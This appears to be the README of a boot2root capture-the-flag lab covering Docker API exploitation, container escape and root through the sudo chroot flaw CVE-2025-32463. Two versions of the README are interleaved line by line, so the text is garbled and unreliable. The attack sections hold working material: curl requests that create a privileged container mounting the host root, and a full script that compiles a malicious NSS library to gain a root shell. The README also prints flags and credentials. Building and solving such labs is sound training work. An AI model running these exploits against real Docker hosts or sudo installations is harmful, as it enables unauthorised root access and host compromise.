# Moby Dock - Boot2Root Challenge# DockerHeist - Boot2Root Challenge



A sophisticated boot2root challenge demonstrating Docker API exploitation, container escape techniques, and privilege escalation via CVE-2025-32463.![Difficulty](https://img.shields.io/badge/Difficulty-Medium%2FHard-orange)

![Type](https://img.shields.io/badge/Type-Boot2Root-red)

## Challenge Information![Skills](https://img.shields.io/badge/Skills-Docker%20%7C%20Container%20Escape%20%7C%20Privilege%20Escalation-blue)



**Difficulty**: Medium/Hard  ## 📋 Challenge Description

**Type**: Boot2Root  

**Estimated Time**: 2-4 hours  Welcome to **DockerHeist**, a sophisticated Boot2Root challenge that takes you through a realistic multi-stage penetration testing scenario. Your mission is to compromise a corporate infrastructure that relies heavily on containerization technology.

**Flags**: 3

A company has deployed a Docker-based infrastructure with a web management portal. Recent security audits have raised concerns about the configuration, but the development team insists everything is secure. Can you prove them wrong?

## Overview

Your goal: Capture all three flags hidden throughout the system by exploiting misconfigurations and known vulnerabilities.

This challenge presents a realistic scenario where a corporate infrastructure relies on Docker for application deployment. The Docker API has been misconfigured and exposed without authentication. Your objective is to exploit this misconfiguration to gain initial access, escape container isolation, and ultimately achieve root privileges on the host system.

## 🎯 Learning Objectives

## Learning Objectives

By completing this challenge, you will learn:

- Understand the security implications of exposed Docker APIs

- Master container exploitation and escape techniques- 🔍 **Docker API Security**: Understanding the risks of exposed Docker APIs

- Learn modern privilege escalation via CVE-2025-32463- 🐋 **Container Exploitation**: Techniques for exploiting Docker misconfigurations

- Recognize and exploit SSRF vulnerabilities- 🚪 **Container Escape**: Breaking out of containerized environments

- Apply defense-in-depth security principles- ⬆️ **Privilege Escalation**: Modern CVE exploitation (CVE-2025-32463)

- 🌐 **SSRF Vulnerabilities**: Server-Side Request Forgery attacks

## Setup- 🛡️ **Defense Strategies**: How to properly secure Docker deployments



### Prerequisites## 📊 Challenge Information



- VirtualBox installed| Property | Value |

- Vagrant 2.4.x or higher|----------|-------|

- 2GB RAM available for VM| **Difficulty** | Medium/Hard |

- 20GB disk space| **Estimated Time** | 2-4 hours |

- Internet connection for initial setup| **Flags** | 3 (flag1.txt, flag2.txt, flag3.txt) |

| **Target IP** | 192.168.56.10 (when using Vagrant) |

### Installation| **Required Tools** | nmap, curl, Python, gcc, Docker knowledge |

| **Skills Required** | Web exploitation, Docker, Linux privilege escalation |

```bash

# Navigate to challenge directory## 🚩 Flags

cd boot2root/abu-b2r-1

1. **flag1.txt** - Gain access to the Docker container

# Start the VM (first run takes 10-15 minutes)2. **flag2.txt** - Escape to the host system (user privilege)

vagrant up3. **flag3.txt** - Escalate to root privileges

```

## 🛠️ Setup Instructions

### Access

### Prerequisites

Once provisioned, the target is accessible at:

- VirtualBox installed

- IP Address: 192.168.56.10- Vagrant installed (2.4.x or higher)

- Web Portal: http://192.168.56.10:8080- 2GB RAM available for VM

- Docker API: http://192.168.56.10:2375- 20GB disk space

- SSH: vagrant@192.168.56.10 (password: vagrant)- Internet connection (for initial setup)



## Challenge Architecture### Windows PowerShell Setup



``````powershell

[Attacker] ----> [Web Portal :8080] --SSRF--> [Docker API :2375]# Navigate to the challenge directory

                                                      |cd "C:\Main\Projects\Challenges\boot2root\abu-b2r-1"

                                                      v

                                            [Docker Containers]# Initialize and start the VM

                                                      |vagrant up

                                                      | Container Escape

                                                      v# This will:

                                                [Host System]# 1. Download Ubuntu 22.04

                                                      |# 2. Configure the VM

                                                      | CVE-2025-32463# 3. Install Docker with exposed API

                                                      v# 4. Setup vulnerable sudo version

                                                [Root Access]# 5. Place all flags

```# 6. Start the web portal



## Attack Chain# The setup will take 10-15 minutes on first run

```

### Stage 1: Reconnaissance

### Linux/macOS Setup

Perform network reconnaissance to identify exposed services.

```bash

```bash# Navigate to the challenge directory

nmap -sC -sV -p- 192.168.56.10cd /mnt/c/Main/Projects/Challenges/boot2root/abu-b2r-1

```

# Initialize and start the VM

Expected findings:vagrant up

- Port 22: SSH```

- Port 2375: Docker API (unauthenticated)

- Port 8080: Web management portal### Accessing the Challenge



### Stage 2: Docker API ExploitationOnce setup is complete, the VM will be accessible at:



The Docker API on port 2375 is exposed without authentication.- **IP Address**: 192.168.56.10

- **Web Portal**: http://192.168.56.10:8080

**Direct API Access**:- **Docker API**: http://192.168.56.10:2375

```bash- **SSH**: `vagrant ssh` or `ssh vagrant@192.168.56.10` (password: vagrant)

# Check Docker version

curl http://192.168.56.10:2375/version### VM Management Commands



# List containers```powershell

curl http://192.168.56.10:2375/containers/json# Start the VM

vagrant up

# Inspect specific container

curl http://192.168.56.10:2375/containers/<container_id>/json# Stop the VM

```vagrant halt



**Alternative: SSRF via Web Portal**:# Restart the VM

Access the web portal at http://192.168.56.10:8080 and use it to query internal services.vagrant reload



**Objective**: Locate and retrieve flag1.txt from the container.# Destroy the VM (clean slate)

vagrant destroy -f

Flag 1: `H7CTF{d0ck3r_4p1_3xp0s3d_w1th0ut_4uth_1s_d34dly_d4ng3r0us}`

# SSH into the VM

### Stage 3: Container Escapevagrant ssh



Create a privileged container with host filesystem access to break out of container isolation.# Check VM status

vagrant status

```bash```

# Create privileged container with host mount

curl -X POST http://192.168.56.10:2375/containers/create \## 🎮 Challenge Flow

  -H "Content-Type: application/json" \

  -d '{```

    "Image": "alpine:latest",┌─────────────────────────────────────────────────────────────┐

    "Cmd": ["/bin/sh"],│                    1. RECONNAISSANCE                         │

    "HostConfig": {│  • Port scanning                                            │

      "Privileged": true,│  • Service enumeration                                       │

      "Binds": ["/:/hostfs:rw"],│  • Web portal discovery                                      │

      "PidMode": "host"└─────────────────────┬───────────────────────────────────────┘

    }                      │

  }'┌─────────────────────▼───────────────────────────────────────┐

│              2. DOCKER API EXPLOITATION                      │

# Start the container│  • Exposed Docker API on port 2375                          │

curl -X POST http://192.168.56.10:2375/containers/<container_id>/start│  • SSRF via web portal (optional)                           │

│  • Create privileged containers                             │

# Execute commands to escape│  🚩 FLAG 1: Container access                                │

curl -X POST http://192.168.56.10:2375/containers/<container_id>/exec \└─────────────────────┬───────────────────────────────────────┘

  -H "Content-Type: application/json" \                      │

  -d '{"AttachStdout": true, "Cmd": ["chroot", "/hostfs", "/bin/bash"]}'┌─────────────────────▼───────────────────────────────────────┐

```│              3. CONTAINER ESCAPE                             │

│  • Privileged container exploitation                        │

**Alternative techniques**:│  • Host filesystem access                                    │

- Use nsenter to access host PID namespace│  • Breaking out to the host                                 │

- Mount host filesystem and chroot into it│  🚩 FLAG 2: User-level access                               │

- Leverage privileged container capabilities└─────────────────────┬───────────────────────────────────────┘

                      │

**Objective**: Escape to host system and retrieve flag2.txt from /home/abu/flag2.txt┌─────────────────────▼───────────────────────────────────────┐

│           4. PRIVILEGE ESCALATION                            │

Flag 2: `H7CTF{c0nt41n3r_br34k0ut_pr1v1l3g3d_3sc4p3_t0_h0st_succ3ssful}`│  • CVE-2025-32463 (Sudo Chroot vulnerability)               │

│  • Exploiting vulnerable sudo (1.9.14-1.9.17)               │

Credentials for host access: abu / abupass123│  • Gaining root access                                       │

│  🚩 FLAG 3: Root access                                     │

### Stage 4: Privilege Escalation└─────────────────────────────────────────────────────────────┘

```

Once on the host system, enumerate for privilege escalation vectors.

## 🔧 Tools Required

```bash

# Check sudo version### Essential Tools

sudo --version- `nmap` - Network scanning

```- `curl` - HTTP requests

- Python 3 with `requests` library

The system runs sudo version 1.9.15p2, which is vulnerable to CVE-2025-32463.- `gcc` - For compiling exploits

- Docker client (optional)

**Exploit CVE-2025-32463**:

### Optional Tools

```bash- Burp Suite - Web traffic analysis

#!/bin/bash- Metasploit - Exploitation framework

# CVE-2025-32463 Exploit- netcat - Reverse shells

- dirb/gobuster - Directory enumeration

STAGE=$(mktemp -d /tmp/exploit.XXXXXX)

cd "$STAGE"## 💡 Hints



# Create malicious NSS library<details>

cat > exploit.c <<'EOF'<summary>🔍 Hint 1: Initial Reconnaissance (Click to expand)</summary>

#include <stdlib.h>

#include <unistd.h>Start with a comprehensive port scan. Look for non-standard ports and services that might be misconfigured. Pay special attention to ports commonly used by container technologies.



__attribute__((constructor))```bash

void exploit(void) {nmap -sC -sV -p- <target_ip>

    setreuid(0,0);```

    setregid(0,0);</details>

    chdir("/");

    execl("/bin/bash","/bin/bash",NULL);<details>

}<summary>🐋 Hint 2: Docker API (Click to expand)</summary>

EOF

The Docker API is typically exposed on port 2375 without authentication. You can interact with it using curl or the Docker client. Try listing containers and exploring what you can do with an unauthenticated API.

# Setup fake chroot environment

mkdir -p woot/etc libnss_```bash

echo "passwd: /exploit" > woot/etc/nsswitch.confcurl http://<target_ip>:2375/version

cp /etc/group woot/etc 2>/dev/null || echo "root:x:0:" > woot/etc/groupcurl http://<target_ip>:2375/containers/json

```

# Compile malicious library</details>

gcc -shared -fPIC -Wl,-init,exploit -o libnss_/exploit.so.2 exploit.c

<details>

# Trigger vulnerability<summary>🚪 Hint 3: Container Escape (Click to expand)</summary>

sudo -R woot woot

Privileged containers with host filesystem mounts can be very dangerous. Look for ways to access the host filesystem from within the container. The `/hostfs` mount might be interesting...

# Cleanup</details>

cd / && rm -rf "$STAGE"

```<details>

<summary>⬆️ Hint 4: Privilege Escalation (Click to expand)</summary>

**Objective**: Escalate to root and retrieve flag3.txt from /root/flag3.txt

Check the sudo version on the system. Versions 1.9.14 to 1.9.17 are vulnerable to CVE-2025-32463. The `-R` (chroot) option might be your ticket to root.

Flag 3: `H7CTF{r00t_4cc3ss_4ch13v3d_cve_2025_32463}`</details>



## Automated Exploitation## 📚 Recommended Reading



An automated exploit script is provided for testing:- [Docker API Security Best Practices](https://docs.docker.com/engine/security/)

- [Container Escape Techniques](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security)

```bash- [CVE-2025-32463 Analysis](https://www.exploit-db.com/exploits/52352)

cd exploits- [SSRF Vulnerability Patterns](https://portswigger.net/web-security/ssrf)

python3 exploit.py 192.168.56.10

```## ⚠️ Important Notes



## VM Management### Educational Purpose Only

This challenge is designed for educational purposes and authorized security testing only. The vulnerabilities demonstrated here are real and should NEVER be exploited on systems you do not own or have explicit permission to test.

```bash

# Start VM### Responsible Disclosure

vagrant upIf you discover these vulnerabilities in production systems:

1. Document the findings

# Stop VM2. Report to the system owner immediately

vagrant halt3. DO NOT exploit or share publicly before patching

4. Follow responsible disclosure practices

# Restart VM

vagrant reload## 🏆 Challenge Rating



# SSH into VMAfter completing the challenge, please rate it:

vagrant ssh- How realistic was the scenario?

- Were the exploitation steps clear?

# Destroy VM- What could be improved?

vagrant destroy -f

```## 🤝 Credits



## Flags**Challenge Author**: AbuCTF  

**Difficulty**: Medium/Hard  

1. **flag1.txt**: Container access via Docker API exploitation**Category**: Boot2Root, Docker Security, Privilege Escalation  

2. **flag2.txt**: Host access via container escape**Version**: 1.0

3. **flag3.txt**: Root access via privilege escalation

## 📝 Writeup Submission

## Defense Recommendations

If you solve this challenge and write a detailed writeup, please share it! Good writeups help others learn and improve the community.

### Docker API Security

- Never expose Docker API without TLS and client certificate authentication### What to include in your writeup:

- Use Unix socket instead of TCP socket when possible1. Initial reconnaissance methodology

- Implement network segmentation to isolate Docker hosts2. Exploitation techniques used

- Enable Docker Content Trust for image verification3. Tools and commands executed

- Regular security audits of Docker configurations4. Screenshots of flags

5. Lessons learned

### Container Hardening6. Defense recommendations

- Avoid running privileged containers in production

- Use read-only root filesystems where applicable## 🛡️ Defense Recommendations

- Implement resource constraints (CPU, memory, network)

- Drop unnecessary capabilitiesAfter completing the challenge, consider these security best practices:

- Use security profiles (AppArmor, SELinux)

- Regular vulnerability scanning of container images### Docker Security

- ✅ Never expose Docker API without TLS and authentication

### System Security- ✅ Use Docker socket proxy with access controls

- Keep all software updated, especially sudo- ✅ Avoid privileged containers in production

- Implement proper SSRF protections in web applications- ✅ Implement least privilege for container users

- Use Web Application Firewalls (WAF)- ✅ Use read-only root filesystems where possible

- Enable comprehensive logging and monitoring- ✅ Enable Docker Content Trust

- Apply principle of least privilege- ✅ Regular security scanning of images

- Regular penetration testing

### System Security

## Technical Details- ✅ Keep all software updated (especially sudo)

- ✅ Implement proper SSRF protections

### VM Specifications- ✅ Use Web Application Firewalls (WAF)

- OS: Ubuntu 22.04 LTS- ✅ Regular security audits

- RAM: 2GB- ✅ Network segmentation

- CPU: 2 cores- ✅ Implement monitoring and alerting

- Network: 192.168.56.10 (private network)

## 🐛 Troubleshooting

### Installed Software

- Docker CE (latest)### VM won't start

- sudo 1.9.15p2 (vulnerable to CVE-2025-32463)```powershell

- Python 3 + Flask# Check VirtualBox installation

- GCC compilerVBoxManage --version

- Standard Linux utilities

# Check Vagrant status

### Usersvagrant status

- vagrant: VM management (password: vagrant)

- abu: Challenge user (password: abupass123)# Try reloading

- root: Target for privilege escalationvagrant reload --provision

```

## Troubleshooting

### Cannot access services

### VM fails to start```bash

```bash# Check if services are running inside VM

# Check VirtualBox and Vagrantvagrant ssh

VBoxManage --versionsudo systemctl status docker

vagrant --versionsudo systemctl status dockerheist-portal

```

# Try reloading with provisioning

vagrant reload --provision### Provisioning errors

``````powershell

# Re-run provisioning

### Services not accessiblevagrant provision

```bash

# SSH into VM and check service status# Or destroy and recreate

vagrant sshvagrant destroy -f

sudo systemctl status dockervagrant up

sudo systemctl status mobydock-portal```

```

## 📞 Support

### Reprovisioning

```bashIf you encounter issues:

# Re-run provisioning scripts1. Check the troubleshooting section

vagrant provision2. Review the SOLUTION.md for detailed exploitation steps

3. Open an issue on the repository

# Or start from scratch4. Contact the challenge author

vagrant destroy -f

vagrant up## 📄 License

```

This challenge is released for educational purposes. Feel free to use it in CTF competitions, training sessions, or personal learning with proper attribution.

## References

---

- Docker Engine API: https://docs.docker.com/engine/api/

- CVE-2025-32463: https://www.exploit-db.com/exploits/52352**Good luck, and happy hacking!** 🎉

- Container Escape Techniques: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security

- SSRF Attacks: https://portswigger.net/web-security/ssrfRemember: The best hackers are also the best defenders. Use these skills to make the internet a safer place.


## File Structure

```
abu-b2r-1/
├── Vagrantfile              # VM configuration
├── README.md                # This file
├── SOLUTION.md              # Detailed walkthrough
├── .gitignore               # Git ignore rules
├── provisioning/            # Setup scripts
│   ├── setup-docker.sh      # Docker installation
│   ├── setup-sudo.sh        # Vulnerable sudo setup
│   ├── setup-users.sh       # User and flag configuration
│   └── setup-web.sh         # Web portal setup
└── exploits/                # Exploitation tools
    ├── exploit.py           # Automated Python exploit
    └── sudo_chroot_exploit.sh  # CVE exploit script
```

## Author

Created by: AbuCTF  
Challenge: Moby Dock  
Type: Boot2Root  
Difficulty: Medium/Hard  
Version: 1.0

## License

This challenge is released for educational purposes. Use only in authorized environments.
